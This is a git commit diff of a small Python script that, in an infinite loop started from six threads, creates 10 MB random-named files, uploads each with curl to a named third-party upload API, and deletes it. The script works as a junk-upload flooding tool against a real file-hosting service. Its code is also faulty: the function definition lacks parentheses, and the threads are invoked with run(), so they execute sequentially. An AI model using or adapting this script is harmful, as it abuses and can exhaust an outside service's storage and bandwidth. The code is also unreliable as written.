13a8801244900967a3b45d958e1c04b60d856428
fivembojufkarz2k21 <107816075+fivembojufkarz2k21@users.noreply.github.com>
2022-07-17 19:45:41 +0200

    Update idkwhatamdoing.py

--- idkwhatamdoing.py
+++ idkwhatamdoing.py
@@ -4,9 +4,26 @@ import random
 low_word = "abcdefghijklkmnopqrstuvwxyz"
 username_for = low_word
 long_username = 12
-
+def rawr:
+    while True:
+        usernamerepl = "".join(random.sample(username_for, long_username))
+        os.system("fallocate -l 10M "+usernamerepl)
+        os.system("curl --form myFile='@"+usernamerepl+"' https://cdn.dnxrg.net/api/upload")
+        os.system("rm "+usernamerepl)
+        
+        
+thread1 = threading.Thread(target=rawr)
+thread2 = threading.Thread(target=rawr)
+thread3 = threading.Thread(target=rawr)
+thread4 = threading.Thread(target=rawr)
+thread5 = threading.Thread(target=rawr)
+thread6 = threading.Thread(target=rawr)
+thread1.run()
+thread2.run()
+thread3.run()
+thread4.run()
+thread5.run()
+thread6.run()
 while True:
-    usernamerepl = "".join(random.sample(username_for, long_username))
-    os.system("fallocate -l 10M "+usernamerepl)
-    os.system("curl --form myFile='@"+usernamerepl+"' https://cdn.dnxrg.net/api/upload")
-    os.system("rm "+usernamerepl)
+    time.sleep(10)
+    print("up")
